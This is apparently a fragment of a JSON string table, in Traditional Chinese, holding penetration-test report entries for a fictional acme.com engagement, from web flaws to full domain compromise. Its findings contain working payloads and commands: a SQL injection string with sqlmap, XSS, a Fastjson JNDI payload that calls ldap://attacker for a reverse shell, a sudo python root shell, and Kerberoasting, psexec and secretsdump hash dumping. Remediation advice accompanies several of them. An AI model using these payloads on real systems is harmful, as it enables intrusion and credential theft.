  "m2453": "Jenkins（內部）",
  "m2454": "網站搜尋中的報錯型 SQL 注入",
  "m2455": "## 漏洞概述\\n\\n`www.acme.com/search` 的 `q` 參數存在**報錯型 SQL 注入**（MSSQL），會暴露資料庫版本、結構描述及潛在敏感資料。\\n\\n## 影響\\n\\n- 可讀取 `acme_prod` 結構描述及使用者／訂單資料\\n- 錯誤回應降低利用難度；高風險\\n\\n## 重現步驟\\n\\n1. 觸發報錯型注入：\\n\\n```\\nGET /search?q=1' AND 1=CONVERT(int,@@version)--\\n```\\n\\n2. 回應顯示 MSSQL 版本錯誤，確認注入成立\\n3. 列舉資料庫：`sqlmap -u \\\"https://www.acme.com/search?q=1\\\" --dbs`\\n\\n## 修復建議\\n\\n- 使用參數化查詢／預備語句取代字串拼接\\n- 停用生產環境的詳細錯誤回應\\n- 對資料庫帳號套用最小權限，並停用 `xp_cmdshell` 等危險擴充\\n",
  "m2456": "www.acme.com/search q 參數的報錯型 SQL 注入",
  "m2457": "GET /search?q=1' AND 1=CONVERT(int,@@version)-- → 回傳 MSSQL 版本錯誤；結構描述可讀取。",
  "m2458": "Acme 網站與管理後台外部評估",
  "m2459": "api.acme.com/v1/orders?id= 透過 IDOR 洩露其他使用者的訂單",
  "m2460": "將 id=1001 改為 id=1002 即回傳另一使用者的訂單，含地址與電話號碼；無所有權檢查。",
  "m2461": "弱 API JWT 密鑰允許離線破解與偽造",
  "m2462": "HS256 密鑰 'secret' 被 john 於 5 秒內破解 → 可偽造任意 sub 以繞過授權。",
  "m2463": "q 參數未跳脫，導致搜尋頁面存在反射型 XSS",
  "m2464": "q=<script>alert(document.domain)</script> 在結果標題中原樣反映。",
  "m2465": "www.acme.com 暴露 .git，允許還原原始碼",
  "m2466": "GET /.git/HEAD → 200；git-dumper 還原後端原始碼，註解中含資料庫連線字串。",
  "m2467": "admin.acme.com 使用預設憑證 admin/admin123",
  "m2468": "登入成功；管理主控台提供使用者與訂單管理功能。",
  "m2469": "登入後透過 next 參數任意跳轉",
  "m2470": "/login?next=https://evil.example 於登入後以 HTTP 302 跳轉至外部網站。",
  "m2471": "登入端點缺乏速率限制，允許暴力破解",
  "m2472": "每分鐘 1,000 次嘗試，無鎖定或 CAPTCHA。",
  "m2473": "API 500 錯誤暴露堆疊追蹤、路徑與框架版本",
  "m2474": "觸發的 500 回傳 Node.js 堆疊追蹤，含絕對路徑與依賴版本。",
  "m2475": "商店使用含已知 RCE 的過時元件",
  "m2476": "指紋識別出元件 v2.3.1，關聯 CVE-2024-xxxx 反序列化 RCE。",
  "m2477": "洩露的原始碼含寫死的資料庫憑證 sa/Acme@2021",
  "m2478": "git-dumper 自 www.acme.com/.git 還原 config.php，內含明文資料庫密碼，後續確認於內部可重複使用。",
  "m2479": "商店 Fastjson 反序列化遠端命令執行",
  "m2480": "## 漏洞概述\\n\\n`shop.acme.com/api/import` 以 **Fastjson 1.2.24** 解析使用者可控的 JSON，且未啟用 `safeMode`。透過 `@type` 可選擇任意類別，形成 **JNDI 注入 → 遠端命令執行**。\\n\\n## 影響\\n\\n- 在 DMZ Web 伺服器（`www-data@dmz-web01`）上未授權執行任意命令\\n- 結合權限提升可取得內網立足點\\n\\n## 重現步驟\\n\\n1. 構造 JNDI payload：\\n\\n```json\\n{\\\"@type\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\",\\\"dataSourceName\\\":\\\"ldap://attacker/Exploit\\\",\\\"autoCommit\\\":true}\\n```\\n\\n2. `POST /api/import`，`Content-Type: application/json`\\n3. 目標回呼 dnslog 並開啟反向 shell\\n\\n## 修復建議\\n\\n- 將 Fastjson 升級至 **1.2.83+** 並啟用 `safeMode`\\n- 為 `/api/import` 新增驗證與來源校驗\\n- 限制出站：禁止應用程式伺服器對外發起 LDAP/RMI\\n",
  "m2481": "shop.acme.com Fastjson 1.2.24 反序列化遠端命令執行",
  "m2482": "以 JNDI payload（@type:JdbcRowSetImpl）POST /api/import → dnslog 回呼並取得反向 shell（www-data@dmz-web01）。",
  "m2483": "DMZ sudo NOPASSWD 設定不當允許本地提權至 root",
  "m2484": "sudo -l 顯示 (ALL) NOPASSWD: /usr/bin/python3 → sudo python3 -c 'os.setuid(0);os.system(\\\"/bin/sh\\\")' 直接取得 root。",
  "m2485": "雙宿主 DMZ 主機繞過內網隔離",
  "m2486": "dmz-web01 的第二張網卡位於 10.10.10.0/24，可從 DMZ 直接觸達網域控制站、檔案伺服器與 Jenkins。",
  "m2487": "未授權的內部 Jenkins Script Console 允許執行遠端命令",
  "m2488": "GET /script 無需登入即可執行 Groovy：'whoami'.execute().text → SYSTEM；並自憑證儲存區匯出網域帳號 acme\\\\\\\\svc_deploy。",
  "m2489": "網域服務帳號 svc_sql 可被 Kerberoast 且密碼強度不足",
  "m2490": "GetUserSPNs 請求 svc_sql 的 TGS；hashcat -m 13100 離線破解出 Sql@2020。該帳號屬於 SQL 管理群組。",
  "m2491": "完全控制內部網域控制站 DC01（Domain Admin）",
  "m2492": "## 漏洞概述\\n\\n外部 Fastjson RCE 提供 DMZ 立足點。sudo 提權、雙宿主主機與未授權 Jenkins RCE 暴露了 **Domain Admins** 成員 `svc_deploy`，進而完全控制 **DC01**。\\n\\n## 影響\\n\\n- 網域管理員權限可控制網域主機與帳號\\n- `secretsdump` 匯出所有網域 NTLM 雜湊（含 `krbtgt`），可製作黃金票據實現持久化\\n- 內部目標已達成\\n\\n## 重現步驟\\n\\n1. 以 `svc_deploy` 登入並匯出雜湊：\\n\\n```\\npsexec.py acme/svc_deploy@10.10.10.10\\nsecretsdump.py acme/svc_deploy@10.10.10.10\\n```\\n\\n2. 在 DC01 取得 SYSTEM 並匯出所有網域雜湊\\n\\n## 修復建議\\n\\n- 降低服務帳號權限、移除 Domain Admins 成員資格並強制分層管理\\n- 重設 `krbtgt` 兩次並輪替強服務帳號密碼\\n- 修復 DMZ／內網隔離及前述 RCE／提權鏈\\n",
  "m2493": "DC01 網域控制站已受控（Domain Admin）— 內部目標達成",
  "m2494": "svc_deploy 屬於 Domain Admins。psexec.py 在 DC01 取得 SYSTEM；secretsdump 匯出含 krbtgt 在內的網域 NTLM 雜湊，完成目標控制。",
  "m2495": "根：acme.com 由外至內評估",
